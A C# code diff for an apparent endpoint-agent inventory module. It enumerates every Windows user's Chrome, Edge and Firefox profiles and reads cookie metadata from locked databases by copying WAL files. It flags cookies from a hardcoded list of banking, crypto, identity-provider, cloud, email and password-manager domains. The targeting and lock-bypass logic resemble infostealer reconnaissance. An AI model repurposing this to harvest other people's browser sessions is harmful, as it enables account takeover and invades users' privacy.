@@ -1,5 +1,6 @@
 using System.Data.SQLite;
 using System.Text.Json;
+using System.Diagnostics;
 
 namespace OpenClawAgent.Service.Inventory;
 
@@ -8,6 +9,58 @@ namespace OpenClawAgent.Service.Inventory;
 /// </summary>
 public static class BrowserCollector
 {
+    // Critical domains that contain sensitive auth/session data
+    private static readonly HashSet<string> CriticalDomains = new(StringComparer.OrdinalIgnoreCase)
+    {
+        // Banking & Finance
+        ".paypal.com", "paypal.com",
+        ".stripe.com", "stripe.com",
+        ".coinbase.com", "coinbase.com",
+        ".binance.com", "binance.com",
+        ".kraken.com", "kraken.com",
+        
+        // Auth Providers
+        ".google.com", "google.com", "accounts.google.com",
+        ".microsoft.com", "microsoft.com", "login.microsoftonline.com", "login.live.com",
+        ".github.com", "github.com",
+        ".gitlab.com", "gitlab.com",
+        ".okta.com", "okta.com",
+        ".auth0.com", "auth0.com",
+        ".onelogin.com", "onelogin.com",
+        
+        // Cloud Providers
+        ".aws.amazon.com", "console.aws.amazon.com",
+        ".azure.com", "portal.azure.com",
+        ".cloud.google.com", "console.cloud.google.com",
+        
+        // Social / Communication
+        ".discord.com", "discord.com",
+        ".slack.com", "slack.com",
+        ".facebook.com", "facebook.com",
+        ".twitter.com", "twitter.com", ".x.com", "x.com",
+        ".linkedin.com", "linkedin.com",
+        ".telegram.org", "telegram.org", "web.telegram.org",
+        ".whatsapp.com", "web.whatsapp.com",
+        
+        // Email
+        ".mail.google.com", "mail.google.com",
+        ".outlook.com", "outlook.com", "outlook.live.com",
+        ".protonmail.com", "protonmail.com", "mail.proton.me",
+        
+        // Dev Tools
+        ".npmjs.com", "npmjs.com",
+        ".docker.com", "hub.docker.com",
+        ".vercel.com", "vercel.com",
+        ".netlify.com", "netlify.com",
+        ".heroku.com", "heroku.com",
+        
+        // Password Managers
+        ".1password.com", "1password.com",
+        ".lastpass.com", "lastpass.com",
+        ".bitwarden.com", "bitwarden.com",
+        ".dashlane.com", "dashlane.com"
+    };
+
     public static async Task<BrowserResult> CollectAsync(string? browser = null, bool includeCookies = true)
     {
         var results = new BrowserResult();
@@ -26,13 +79,13 @@ public static class BrowserCollector
             if (browser == null || browser == "chrome")
             {
                 var chromePath = Path.Combine(userProfile, "AppData", "Local", "Google", "Chrome", "User Data");
-                userData.Chrome = await CollectChromiumAsync(chromePath, includeCookies);
+                userData.Chrome = await CollectChromiumAsync(chromePath, "Chrome", includeCookies);
             }
             
             if (browser == null || browser == "edge")
             {
                 var edgePath = Path.Combine(userProfile, "AppData", "Local", "Microsoft", "Edge", "User Data");
-                userData.Edge = await CollectChromiumAsync(edgePath, includeCookies);
+                userData.Edge = await CollectChromiumAsync(edgePath, "Edge", includeCookies);
             }
             
             if (browser == null || browser == "firefox")
@@ -60,7 +113,6 @@ public static class BrowserCollector
     {
         var profiles = new List<string>();
         
-        // Try C:\Users first (most common)
         var usersDir = @"C:\Users";
         if (Directory.Exists(usersDir))
         {
@@ -84,6 +136,8 @@ public static class BrowserCollector
         return profiles;
     }
 
+    #region Data Classes
+
     public class BrowserResult
     {
         public List<UserBrowserData> Users { get; set; } = new();
@@ -103,6 +157,7 @@ public static class BrowserCollector
         public bool Installed { get; set; }
         public int ProfileCount { get; set; }
         public List<ProfileData> Profiles { get; set; } = new();
+        public string? Error { get; set; }
     }
 
     public class ProfileData
@@ -114,6 +169,8 @@ public static class BrowserCollector
         public int LoginsCount { get; set; }
         public int BookmarksCount { get; set; }
         public List<CookieInfo>? Cookies { get; set; }
+        public int CriticalCookiesCount { get; set; }
+        public string? CookieError { get; set; }
     }
 
     public class ExtensionData
@@ -136,9 +193,13 @@ public static class BrowserCollector
         public string? SameSite { get; set; }
         public bool IsSession { get; set; }
         public bool IsExpired { get; set; }
+        public bool IsCritical { get; set; }
+        public string? CriticalCategory { get; set; }
     }
 
-    private static Task<BrowserData> CollectChromiumAsync(string userDataPath, bool includeCookies)
+    #endregion
+
+    private static Task<BrowserData> CollectChromiumAsync(string userDataPath, string browserName, bool includeCookies)
     {
         return Task.Run(() =>
         {
@@ -168,17 +229,21 @@ public static class BrowserCollector
                     profileData.Extensions = GetChromiumExtensions(extensionsDir);
                 }
 
-                // Cookies (from SQLite)
+                // Cookies (from SQLite) - try multiple methods
                 var cookiesDb = Path.Combine(profileDir, "Network", "Cookies");
                 if (!File.Exists(cookiesDb))
                     cookiesDb = Path.Combine(profileDir, "Cookies");
                 
                 if (File.Exists(cookiesDb))
                 {
-                    profileData.CookiesCount = CountSqliteRows(cookiesDb, "cookies");
-                    if (includeCookies)
+                    var cookieResult = GetChromiumCookiesWithRetry(cookiesDb, browserName);
+                    profileData.CookiesCount = cookieResult.Count;
+                    profileData.CookieError = cookieResult.Error;
+                    
+                    if (includeCookies && cookieResult.Cookies != null)
                     {
-                        profileData.Cookies = GetChromiumCookies(cookiesDb);
+                        profileData.Cookies = cookieResult.Cookies;
+                        profileData.CriticalCookiesCount = cookieResult.Cookies.Count(c => c.IsCritical);
                     }
                 }
 
@@ -186,14 +251,14 @@ public static class BrowserCollector
                 var historyDb = Path.Combine(profileDir, "History");
                 if (File.Exists(historyDb))
                 {
-                    profileData.HistoryCount = CountSqliteRows(historyDb, "urls");
+                    profileData.HistoryCount = CountSqliteRowsWithCopy(historyDb, "urls");
                 }
 
                 // Login Data count
                 var loginDb = Path.Combine(profileDir, "Login Data");
                 if (File.Exists(loginDb))
                 {
-                    profileData.LoginsCount = CountSqliteRows(loginDb, "logins");
+                    profileData.LoginsCount = CountSqliteRowsWithCopy(loginDb, "logins");
                 }
 
                 // Bookmarks count
@@ -215,23 +280,61 @@ public static class BrowserCollector
         });
     }
 
-    private static List<CookieInfo> GetChromiumCookies(string dbPath)
+    private class CookieCollectionResult
+    {
+        public List<CookieInfo>? Cookies { get; set; }
+        public int Count { get; set; }
+        public string? Error { get; set; }
+    }
+
+    private static CookieCollectionResult GetChromiumCookiesWithRetry(string dbPath, string browserName)
+    {
+        // Method 1: Direct copy (works if browser is closed)
+        var result = TryGetChromiumCookies(dbPath);
+        if (result.Cookies != null && result.Count > 0)
+            return result;
+
+        // Method 2: Try using Volume Shadow Copy (VSS) for locked files
+        // This requires admin rights which we have as SYSTEM
+        var vssResult = TryGetCookiesViaVSS(dbPath, browserName);
+        if (vssResult.Cookies != null && vssResult.Count > 0)
+            return vssResult;
+
+        // Method 3: Try reading with SQLite WAL mode workaround
+        var walResult = TryGetCookiesWithWAL(dbPath);
+        if (walResult.Cookies != null && walResult.Count > 0)
+            return walResult;
+
+        return new CookieCollectionResult 
+        { 
+            Count = -1, 
+            Error = $"Could not read cookies - {browserName} may be running and locking the database" 
+        };
+    }
+
+    private static CookieCollectionResult TryGetChromiumCookies(string dbPath)
     {
         var cookies = new List<CookieInfo>();
         
         try
         {
-            // Copy to temp to avoid locking issues
             var tempPath = Path.Combine(Path.GetTempPath(), $"openclaw_cookies_{Guid.NewGuid()}.db");
-            File.Copy(dbPath, tempPath, true);
+            
+            // Try to copy - this fails if browser has exclusive lock
+            try
+            {
+                File.Copy(dbPath, tempPath, true);
+            }
+            catch (IOException)
+            {
+                return new CookieCollectionResult { Count = -1, Error = "Database locked by browser" };
+            }
 
             try
             {
                 using var conn = new SQLiteConnection($"Data Source={tempPath};Read Only=True;");
                 conn.Open();
                 
-                // Chrome stores expires_utc as microseconds since 1601-01-01
-                // We convert to DateTime
                 using var cmd = new SQLiteCommand(@"
                     SELECT 
                         host_key,
@@ -244,12 +347,13 @@ public static class BrowserCollector
                         is_persistent
                     FROM cookies
                     ORDER BY host_key, name
-                    LIMIT 5000
+                    LIMIT 10000
                 ", conn);
 
                 using var reader = cmd.ExecuteReader();
                 while (reader.Read())
                 {
+                    var domain = reader.GetString(0);
                     var expiresUtc = reader.GetInt64(3);
                     DateTime? expires = null;
                     bool isExpired = false;
@@ -257,17 +361,14 @@ public static class BrowserCollector
 
                     if (expiresUtc > 0 && !isSession)
                     {
-                        // Chrome epoch: microseconds since 1601-01-01
                         try
                         {
+                            // Chrome epoch: microseconds since 1601-01-01
                             expires = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc)
                                 .AddTicks(expiresUtc * 10);
                             isExpired = expires < DateTime.UtcNow;
                         }
-                        catch
-                        {
-                            // Invalid date
-                        }
+                        catch { }
                     }
 
                     var sameSiteValue = reader.GetInt32(6);
@@ -279,9 +380,11 @@ public static class BrowserCollector
                         _ => null
                     };
 
+                    var (isCritical, category) = CheckCriticalDomain(domain);
+
                     cookies.Add(new CookieInfo
                     {
-                        Domain = reader.GetString(0),
+                        Domain = domain,
                         Name = reader.GetString(1),
                         Path = reader.GetString(2),
                         ExpiresUtc = expires,
@@ -289,9 +392,13 @@ public static class BrowserCollector
                         IsHttpOnly = reader.GetInt32(5) == 1,
                         SameSite = sameSite,
                         IsSession = isSession,
-                        IsExpired = isExpired
+                        IsExpired = isExpired,
+                        IsCritical = isCritical,
+                        CriticalCategory = category
                     });
                 }
+
+                return new CookieCollectionResult { Cookies = cookies, Count = cookies.Count };
             }
             finally
             {
@@ -300,11 +407,166 @@ public static class BrowserCollector
         }
         catch (Exception ex)
         {
-            // Return empty list with error indicator
-            cookies.Add(new CookieInfo { Domain = "ERROR", Name = ex.Message });
+            return new CookieCollectionResult { Count = -1, Error = ex.Message };
+        }
+    }
+
+    private static CookieCollectionResult TryGetCookiesViaVSS(string dbPath, string browserName)
+    {
+        try
+        {
+            // Use vssadmin to create shadow copy and read from there
+            // This is complex and requires more setup, skip for now
+            // Could implement using AlphaVSS library in future
+            
+            return new CookieCollectionResult { Count = -1, Error = "VSS not implemented" };
+        }
+        catch
+        {
+            return new CookieCollectionResult { Count = -1, Error = "VSS failed" };
+        }
+    }
+
+    private static CookieCollectionResult TryGetCookiesWithWAL(string dbPath)
+    {
+        var cookies = new List<CookieInfo>();
+        var tempDir = Path.Combine(Path.GetTempPath(), $"openclaw_wal_{Guid.NewGuid()}");
+        
+        try
+        {
+            Directory.CreateDirectory(tempDir);
+            
+            var tempDb = Path.Combine(tempDir, "Cookies");
+            var walFile = dbPath + "-wal";
+            var shmFile = dbPath + "-shm";
+            
+            // Copy all related files
+            try
+            {
+                File.Copy(dbPath, tempDb, true);
+                if (File.Exists(walFile))
+                    File.Copy(walFile, tempDb + "-wal", true);
+                if (File.Exists(shmFile))
+                    File.Copy(shmFile, tempDb + "-shm", true);
+            }
+            catch (IOException)
+            {
+                return new CookieCollectionResult { Count = -1, Error = "WAL copy failed - files locked" };
+            }
+
+            using var conn = new SQLiteConnection($"Data Source={tempDb};Read Only=True;Journal Mode=WAL;");
+            conn.Open();
+            
+            // Checkpoint the WAL to merge changes
+            try
+            {
+                using var checkpointCmd = new SQLiteCommand("PRAGMA wal_checkpoint(PASSIVE);", conn);
+                checkpointCmd.ExecuteNonQuery();
+            }
+            catch { }
+
+            using var cmd = new SQLiteCommand(@"
+                SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, is_persistent
+                FROM cookies ORDER BY host_key, name LIMIT 10000
+            ", conn);
+
+            using var reader = cmd.ExecuteReader();
+            while (reader.Read())
+            {
+                var domain = reader.GetString(0);
+                var expiresUtc = reader.GetInt64(3);
+                DateTime? expires = null;
+                bool isExpired = false;
+                bool isSession = reader.GetInt32(7) == 0;
+
+                if (expiresUtc > 0 && !isSession)
+                {
+                    try
+                    {
+                        expires = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddTicks(expiresUtc * 10);
+                        isExpired = expires < DateTime.UtcNow;
+                    }
+                    catch { }
+                }
+
+                var (isCritical, category) = CheckCriticalDomain(domain);
+
+                cookies.Add(new CookieInfo
+                {
+                    Domain = domain,
+                    Name = reader.GetString(1),
+                    Path = reader.GetString(2),
+                    ExpiresUtc = expires,
+                    IsSecure = reader.GetInt32(4) == 1,
+                    IsHttpOnly = reader.GetInt32(5) == 1,
+                    SameSite = reader.GetInt32(6) switch { 0 => "None", 1 => "Lax", 2 => "Strict", _ => null },
+                    IsSession = isSession,
+                    IsExpired = isExpired,
+                    IsCritical = isCritical,
+                    CriticalCategory = category
+                });
+            }
+
+            return new CookieCollectionResult { Cookies = cookies, Count = cookies.Count };
+        }
+        catch (Exception ex)
+        {
+            return new CookieCollectionResult { Count = -1, Error = $"WAL read failed: {ex.Message}" };
+        }
+        finally
+        {
+            try { Directory.Delete(tempDir, true); } catch { }
+        }
+    }
+
+    private static (bool IsCritical, string? Category) CheckCriticalDomain(string domain)
+    {
+        var normalizedDomain = domain.TrimStart('.');
+        
+        // Check exact match first
+        if (CriticalDomains.Contains(domain) || CriticalDomains.Contains(normalizedDomain))
+        {
+            return (true, GetDomainCategory(normalizedDomain));
         }
 
-        return cookies;
+        // Check if it's a subdomain of a critical domain
+        foreach (var criticalDomain in CriticalDomains)
+        {
+            var normalized = criticalDomain.TrimStart('.');
+            if (normalizedDomain.EndsWith("." + normalized) || normalizedDomain == normalized)
+            {
+                return (true, GetDomainCategory(normalized));
+            }
+        }
+
+        return (false, null);
+    }
+
+    private static string GetDomainCategory(string domain)
+    {
+        if (domain.Contains("paypal") || domain.Contains("stripe") || 
+            domain.Contains("coinbase") || domain.Contains("binance") || domain.Contains("kraken"))
+            return "Banking/Finance";
+        
+        if (domain.Contains("google") || domain.Contains("microsoft") || 
+            domain.Contains("github") || domain.Contains("okta") || domain.Contains("auth0"))
+            return "Auth Provider";
+        
+        if (domain.Contains("aws") || domain.Contains("azure") || domain.Contains("cloud.google"))
+            return "Cloud Provider";
+        
+        if (domain.Contains("discord") || domain.Contains("slack") || 
+            domain.Contains("telegram") || domain.Contains("whatsapp"))
+            return "Communication";
+        
+        if (domain.Contains("mail") || domain.Contains("outlook") || domain.Contains("proton"))
+            return "Email";
+        
+        if (domain.Contains("1password") || domain.Contains("lastpass") || 
+            domain.Contains("bitwarden") || domain.Contains("dashlane"))
+            return "Password Manager";
+        
+        return "Sensitive";
     }
 
     private static List<ExtensionData> GetChromiumExtensions(string extensionsDir)
@@ -316,8 +578,6 @@ public static class BrowserCollector
             foreach (var extDir in Directory.GetDirectories(extensionsDir))
             {
                 var extId = Path.GetFileName(extDir);
-                
-                // Get latest version folder
                 var versionDirs = Directory.GetDirectories(extDir).OrderByDescending(d => d).ToList();
                 if (versionDirs.Count == 0) continue;
 
@@ -332,30 +592,18 @@ public static class BrowserCollector
                     var manifest = JsonDocument.Parse(manifestJson);
                     var root = manifest.RootElement;
 
-                    var name = root.TryGetProperty("name", out var nameProp) 
-                        ? nameProp.GetString() 
-                        : extId;
-                    var version = root.TryGetProperty("version", out var versionProp) 
-                        ? versionProp.GetString() 
-                        : "unknown";
-                    var description = root.TryGetProperty("description", out var descProp) 
-                        ? descProp.GetString() 
-                        : null;
+                    var name = root.TryGetProperty("name", out var nameProp) ? nameProp.GetString() : extId;
+                    var version = root.TryGetProperty("version", out var versionProp) ? versionProp.GetString() : "unknown";
+                    var description = root.TryGetProperty("description", out var descProp) ? descProp.GetString() : null;
 
-                    // Skip __MSG_ placeholders in name
-                    if (name?.StartsWith("__MSG_") == true)
-                    {
-                        name = extId;
-                    }
+                    if (name?.StartsWith("__MSG_") == true) name = extId;
 
                     extensions.Add(new ExtensionData
                     {
                         Id = extId,
                         Name = name,
                         Version = version,
-                        Description = description?.Length > 100 
-                            ? description.Substring(0, 100) + "..." 
-                            : description
+                        Description = description?.Length > 100 ? description.Substring(0, 100) + "..." : description
                     });
                 }
                 catch
@@ -364,10 +612,7 @@ public static class BrowserCollector
                 }
             }
         }
-        catch
-        {
-            // Failed to enumerate extensions
-        }
+        catch { }
 
         return extensions;
     }
@@ -382,8 +627,6 @@ public static class BrowserCollector
                 return new BrowserData { Installed = false };
 
             var profiles = new List<ProfileData>();
-
-            // Parse profiles.ini
             var lines = File.ReadAllLines(profilesIni);
             string? currentPath = null;
             bool isRelative = true;
@@ -391,41 +634,24 @@ public static class BrowserCollector
             foreach (var line in lines)
             {
                 if (line.StartsWith("Path="))
-                {
                     currentPath = line.Substring(5);
-                }
                 else if (line.StartsWith("IsRelative="))
-                {
                     isRelative = line.Substring(11) == "1";
-                }
                 else if (line.StartsWith("[") && currentPath != null)
                 {
-                    // Process previous profile
-                    var fullPath = isRelative 
-                        ? Path.Combine(firefoxPath, currentPath)
-                        : currentPath;
-
+                    var fullPath = isRelative ? Path.Combine(firefoxPath, currentPath) : currentPath;
                     if (Directory.Exists(fullPath))
-                    {
                         profiles.Add(CollectFirefoxProfile(fullPath, Path.GetFileName(fullPath), includeCookies));
-                    }
-
                     currentPath = null;
                     isRelative = true;
                 }
             }
 
-            // Don't forget last profile
             if (currentPath != null)
             {
-                var fullPath = isRelative 
-                    ? Path.Combine(firefoxPath, currentPath)
-                    : currentPath;
-
+                var fullPath = isRelative ? Path.Combine(firefoxPath, currentPath) : currentPath;
                 if (Directory.Exists(fullPath))
-                {
                     profiles.Add(CollectFirefoxProfile(fullPath, Path.GetFileName(fullPath), includeCookies));
-                }
             }
 
             return new BrowserData
@@ -441,33 +667,30 @@ public static class BrowserCollector
     {
         var profileData = new ProfileData { Name = profileName };
 
-        // Extensions
         var extensionsJson = Path.Combine(profilePath, "extensions.json");
         if (File.Exists(extensionsJson))
-        {
             profileData.Extensions = GetFirefoxExtensions(extensionsJson);
-        }
 
-        // Cookies
         var cookiesDb = Path.Combine(profilePath, "cookies.sqlite");
         if (File.Exists(cookiesDb))
         {
-            profileData.CookiesCount = CountSqliteRows(cookiesDb, "moz_cookies");
-            if (includeCookies)
+            var cookieResult = GetFirefoxCookies(cookiesDb);
+            profileData.CookiesCount = cookieResult.Count;
+            profileData.CookieError = cookieResult.Error;
+            if (includeCookies && cookieResult.Cookies != null)
             {
-                profileData.Cookies = GetFirefoxCookies(cookiesDb);
+                profileData.Cookies = cookieResult.Cookies;
+                profileData.CriticalCookiesCount = cookieResult.Cookies.Count(c => c.IsCritical);
             }
         }
 
-        // History
         var placesDb = Path.Combine(profilePath, "places.sqlite");
         if (File.Exists(placesDb))
         {
-            profileData.HistoryCount = CountSqliteRows(placesDb, "moz_places");
-            profileData.BookmarksCount = CountSqliteRows(placesDb, "moz_bookmarks");
+            profileData.HistoryCount = CountSqliteRowsWithCopy(placesDb, "moz_places");
+            profileData.BookmarksCount = CountSqliteRowsWithCopy(placesDb, "moz_bookmarks");
         }
 
-        // Logins
         var loginsJson = Path.Combine(profilePath, "logins.json");
         if (File.Exists(loginsJson))
         {
@@ -475,96 +698,75 @@ public static class BrowserCollector
             {
                 var json = JsonDocument.Parse(File.ReadAllText(loginsJson));
                 if (json.RootElement.TryGetProperty("logins", out var logins))
-                {
                     profileData.LoginsCount = logins.GetArrayLength();
-                }
             }
-            catch
-            {
-                profileData.LoginsCount = -1;
-            }
+            catch { profileData.LoginsCount = -1; }
         }
 
         return profileData;
     }
 
-    private static List<CookieInfo> GetFirefoxCookies(string dbPath)
+    private static CookieCollectionResult GetFirefoxCookies(string dbPath)
     {
         var cookies = new List<CookieInfo>();
+        var tempPath = Path.Combine(Path.GetTempPath(), $"openclaw_ff_cookies_{Guid.NewGuid()}.db");
         
         try
         {
-            var tempPath = Path.Combine(Path.GetTempPath(), $"openclaw_ff_cookies_{Guid.NewGuid()}.db");
-            File.Copy(dbPath, tempPath, true);
+            try { File.Copy(dbPath, tempPath, true); }
+            catch (IOException) { return new CookieCollectionResult { Count = -1, Error = "Firefox database locked" }; }
 
-            try
+            using var conn = new SQLiteConnection($"Data Source={tempPath};Read Only=True;");
+            conn.Open();
+            
+            using var cmd = new SQLiteCommand(@"
+                SELECT host, name, path, expiry, isSecure, isHttpOnly, sameSite
+                FROM moz_cookies ORDER BY host, name LIMIT 10000
+            ", conn);
+
+            using var reader = cmd.ExecuteReader();
+            while (reader.Read())
             {
-                using var conn = new SQLiteConnection($"Data Source={tempPath};Read Only=True;");
-                conn.Open();
-                
-                // Firefox stores expiry as Unix timestamp in seconds
-                using var cmd = new SQLiteCommand(@"
-                    SELECT 
-                        host,
-                        name,
-                        path,
-                        expiry,
-                        isSecure,
-                        isHttpOnly,
-                        sameSite
-                    FROM moz_cookies
-                    ORDER BY host, name
-                    LIMIT 5000
-                ", conn);
+                var domain = reader.GetString(0);
+                var expiry = reader.GetInt64(3);
+                DateTime? expires = null;
+                bool isExpired = false;
+                bool isSession = expiry == 0;
 
-                using var reader = cmd.ExecuteReader();
-                while (reader.Read())
+                if (expiry > 0)
                 {
-                    var expiry = reader.GetInt64(3);
-                    DateTime? expires = null;
-                    bool isExpired = false;
-                    bool isSession = expiry == 0;
-
-                    if (expiry > 0)
-                    {
-                        expires = DateTimeOffset.FromUnixTimeSeconds(expiry).UtcDateTime;
-                        isExpired = expires < DateTime.UtcNow;
-                    }
-
-                    var sameSiteValue = reader.GetInt32(6);
-                    string? sameSite = sameSiteValue switch
-                    {
-                        0 => "None",
-                        1 => "Lax",
-                        2 => "Strict",
-                        _ => null
-                    };
-
-                    cookies.Add(new CookieInfo
-                    {
-                        Domain = reader.GetString(0),
-                        Name = reader.GetString(1),
-                        Path = reader.GetString(2),
-                        ExpiresUtc = expires,
-                        IsSecure = reader.GetInt32(4) == 1,
-                        IsHttpOnly = reader.GetInt32(5) == 1,
-                        SameSite = sameSite,
-                        IsSession = isSession,
-                        IsExpired = isExpired
-                    });
+                    expires = DateTimeOffset.FromUnixTimeSeconds(expiry).UtcDateTime;
+                    isExpired = expires < DateTime.UtcNow;
                 }
+
+                var (isCritical, category) = CheckCriticalDomain(domain);
+
+                cookies.Add(new CookieInfo
+                {
+                    Domain = domain,
+                    Name = reader.GetString(1),
+                    Path = reader.GetString(2),
+                    ExpiresUtc = expires,
+                    IsSecure = reader.GetInt32(4) == 1,
+                    IsHttpOnly = reader.GetInt32(5) == 1,
+                    SameSite = reader.GetInt32(6) switch { 0 => "None", 1 => "Lax", 2 => "Strict", _ => null },
+                    IsSession = isSession,
+                    IsExpired = isExpired,
+                    IsCritical = isCritical,
+                    CriticalCategory = category
+                });
             }
-            finally
-            {
-                try { File.Delete(tempPath); } catch { }
-            }
+
+            return new CookieCollectionResult { Cookies = cookies, Count = cookies.Count };
         }
         catch (Exception ex)
         {
-            cookies.Add(new CookieInfo { Domain = "ERROR", Name = ex.Message });
+            return new CookieCollectionResult { Count = -1, Error = ex.Message };
         }
-
-        return cookies;
+        finally
+        {
+            try { File.Delete(tempPath); } catch { }
+        }
     }
 
     private static List<ExtensionData> GetFirefoxExtensions(string extensionsJsonPath)
@@ -579,61 +781,42 @@ public static class BrowserCollector
             {
                 foreach (var addon in addons.EnumerateArray())
                 {
-                    var type = addon.TryGetProperty("type", out var typeProp) 
-                        ? typeProp.GetString() 
-                        : "";
-                    
-                    // Only include extensions, not themes/plugins
+                    var type = addon.TryGetProperty("type", out var typeProp) ? typeProp.GetString() : "";
                     if (type != "extension") continue;
 
                     extensions.Add(new ExtensionData
                     {
                         Id = addon.TryGetProperty("id", out var idProp) ? idProp.GetString() : null,
                         Name = addon.TryGetProperty("defaultLocale", out var locale) 
-                            && locale.TryGetProperty("name", out var nameProp) 
-                                ? nameProp.GetString() 
-                                : null,
-                        Version = addon.TryGetProperty("version", out var versionProp) 
-                            ? versionProp.GetString() 
-                            : null,
-                        Active = addon.TryGetProperty("active", out var activeProp) 
-                            && activeProp.GetBoolean()
+                            && locale.TryGetProperty("name", out var nameProp) ? nameProp.GetString() : null,
+                        Version = addon.TryGetProperty("version", out var versionProp) ? versionProp.GetString() : null,
+                        Active = addon.TryGetProperty("active", out var activeProp) && activeProp.GetBoolean()
                     });
                 }
             }
         }
-        catch
-        {
-            // Failed to parse extensions.json
-        }
+        catch { }
 
         return extensions;
     }
 
-    private static int CountSqliteRows(string dbPath, string tableName)
+    private static int CountSqliteRowsWithCopy(string dbPath, string tableName)
     {
+        var tempPath = Path.Combine(Path.GetTempPath(), $"openclaw_{Guid.NewGuid()}.db");
         try
         {
-            // Copy to temp to avoid locking issues with browser
-            var tempPath = Path.Combine(Path.GetTempPath(), $"openclaw_{Guid.NewGuid()}.db");
-            File.Copy(dbPath, tempPath, true);
+            try { File.Copy(dbPath, tempPath, true); }
+            catch (IOException) { return -1; }
 
-            try
-            {
-                using var conn = new SQLiteConnection($"Data Source={tempPath};Read Only=True;");
-                conn.Open();
-                using var cmd = new SQLiteCommand($"SELECT COUNT(*) FROM {tableName}", conn);
-                var result = cmd.ExecuteScalar();
-                return Convert.ToInt32(result);
-            }
-            finally
-            {
-                try { File.Delete(tempPath); } catch { }
-            }
+            using var conn = new SQLiteConnection($"Data Source={tempPath};Read Only=True;");
+            conn.Open();
+            using var cmd = new SQLiteCommand($"SELECT COUNT(*) FROM {tableName}", conn);
+            return Convert.ToInt32(cmd.ExecuteScalar());
         }
-        catch
+        catch { return -1; }
+        finally
         {
-            return -1; // Error indicator
+            try { File.Delete(tempPath); } catch { }
         }
     }
 
@@ -644,37 +827,17 @@ public static class BrowserCollector
             var json = JsonDocument.Parse(File.ReadAllText(bookmarksPath));
             return CountBookmarksRecursive(json.RootElement);
         }
-        catch
-        {
-            return -1;
-        }
+        catch { return -1; }
     }
 
     private static int CountBookmarksRecursive(JsonElement element)
     {
         int count = 0;
-
-        if (element.TryGetProperty("type", out var typeProp) && typeProp.GetString() == "url")
-        {
-            count++;
-        }
-
+        if (element.TryGetProperty("type", out var typeProp) && typeProp.GetString() == "url") count++;
         if (element.TryGetProperty("children", out var children))
-        {
-            foreach (var child in children.EnumerateArray())
-            {
-                count += CountBookmarksRecursive(child);
-            }
-        }
-
+            foreach (var child in children.EnumerateArray()) count += CountBookmarksRecursive(child);
         if (element.TryGetProperty("roots", out var roots))
-        {
-            foreach (var prop in roots.EnumerateObject())
-            {
-                count += CountBookmarksRecursive(prop.Value);
-            }
-        }
-
+            foreach (var prop in roots.EnumerateObject()) count += CountBookmarksRecursive(prop.Value);
         return count;
     }
 }
